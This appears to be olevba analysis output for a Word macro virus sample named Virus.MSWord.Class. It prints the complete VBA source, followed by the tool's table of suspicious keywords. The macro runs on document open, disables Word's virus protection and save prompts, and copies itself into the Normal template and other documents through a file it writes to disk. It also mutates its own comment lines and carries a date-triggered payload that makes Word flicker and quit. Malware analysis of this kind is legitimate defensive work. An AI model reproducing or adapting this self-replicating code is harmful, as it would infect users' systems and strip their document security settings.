olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fn-27236ce5012769212d3c51e57fe8447f4f6ce650
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fn-27236ce5012769212d3c51e57fe8447f4f6ce650 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Truec:\program files\microsoft office\office\startupDocument1Document1
On Error GoTo 75
'Truec:\program files\microsoft office\office\startupDocument1Document1
I = 0
'Truec:\program files\microsoft office\office\startupDocument1Document1
Options.VirusProtection = False
'Truec:\program files\microsoft office\office\startupDocument1Document1
Options.SaveNormalPrompt = False
'Truec:\program files\microsoft office\office\startupDocument1Document1
Options.ConfirmConversions = False
'Truec:\program files\microsoft office\office\startupDocument1Document1
If Day(13) And Month(11) Then Call ©
'Truec:\program files\microsoft office\office\startupDocument1Document1
gx = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Truec:\program files\microsoft office\office\startupDocument1Document1
xg = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Truec:\program files\microsoft office\office\startupDocument1Document1
If xg > 94 And gx > 0 Then GoTo 75
'Truec:\program files\microsoft office\office\startupDocument1Document1
If xg < 94 Then
'Truec:\program files\microsoft office\office\startupDocument1Document1
 Set bg = NormalTemplate.VBProject.VBComponents.Item(1)
'Truec:\program files\microsoft office\office\startupDocument1Document1
 ActiveDocument.VBProject.VBComponents.Item(1).Name = bg.Name
'Truec:\program files\microsoft office\office\startupDocument1Document1
 ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\gerbil.sys"
'Truec:\program files\microsoft office\office\startupDocument1Document1
End If
'Truec:\program files\microsoft office\office\startupDocument1Document1
If gx = 0 Then Set bg = ActiveDocument.VBProject.VBComponents.Item(1)
'Truec:\program files\microsoft office\office\startupDocument1Document1
 Infection = Int(Rnd * 50)
'Truec:\program files\microsoft office\office\startupDocument1Document1
 If Infection = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(71) + Chr(69) + Chr(82) + Chr(66) + Chr(73) + Chr(76) + Chr(32) + Chr(66) + Chr(121) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'Truec:\program files\microsoft office\office\startupDocument1Document1
 bg.codemodule.AddFromFile ("c:\gerbil.sys")
'Truec:\program files\microsoft office\office\startupDocument1Document1
 With bg.codemodule
'Truec:\program files\microsoft office\office\startupDocument1Document1
    For x = 1 To 4
'Truec:\program files\microsoft office\office\startupDocument1Document1
    .deletelines 1
'Truec:\program files\microsoft office\office\startupDocument1Document1
    Next x
'Truec:\program files\microsoft office\office\startupDocument1Document1
 End With
'Truec:\program files\microsoft office\office\startupDocument1Document1
 If xg < 94 Then
'Truec:\program files\microsoft office\office\startupDocument1Document1
    With bg.codemodule
'Truec:\program files\microsoft office\office\startupDocument1Document1
    .replaceline 1, "Sub AutoClose()"
'Truec:\program files\microsoft office\office\startupDocument1Document1
    .replaceline 99, "Sub ToolsMacro()"
'Truec:\program files\microsoft office\office\startupDocument1Document1
    rd = Int(Rnd * 100)
'Truec:\program files\microsoft office\office\startupDocument1Document1
If rd = 99 Then .replaceline 69, ".replaceline x, ""'"" & Application.Version & Application.MathCoprocessorAvailable & Application.FocusInMailHeader & Application.ActiveWindow"
'Truec:\program files\microsoft office\office\startupDocument1Document1
End With
'Truec:\program files\microsoft office\office\startupDocument1Document1
 End If
'Truec:\program files\microsoft office\office\startupDocument1Document1
 With bg.codemodule
'Truec:\program files\microsoft office\office\startupDocument1Document1
    For x = 2 To 96 Step 2
'Truec:\program files\microsoft office\office\startupDocument1Document1
    .replaceline x, "'" & Application.DisplayRecentFiles & Application.StartupPath & Application.ActiveDocument & Application.ActiveWindow
'Truec:\program files\microsoft office\office\startupDocument1Document1
    Next x
'Truec:\program files\microsoft office\office\startupDocument1Document1
 End With
'Truec:\program files\microsoft office\office\startupDocument1Document1
75:
'Truec:\program files\microsoft office\office\startupDocument1Document1
 If xg > 94 And gx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Truec:\program files\microsoft office\office\startupDocument1Document1
End Sub
'Truec:\program files\microsoft office\office\startupDocument1Document1
Private Sub ©()
'Truec:\program files\microsoft office\office\startupDocument1Document1
Top:
'Truec:\program files\microsoft office\office\startupDocument1Document1
I = I + 1
'Truec:\program files\microsoft office\office\startupDocument1Document1
On Error Resume Next
'Truec:\program files\microsoft office\office\startupDocument1Document1
Application.WindowState = wdWindowStateMinimize
'Truec:\program files\microsoft office\office\startupDocument1Document1
Application.WindowState = wdWindowStateMaximize
'Truec:\program files\microsoft office\office\startupDocument1Document1
If I < 10 Then GoTo Top
'Truec:\program files\microsoft office\office\startupDocument1Document1
Application.Quit
'Truec:\program files\microsoft office\office\startupDocument1Document1
End Sub

Sub ViewVBCode()

End Sub





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

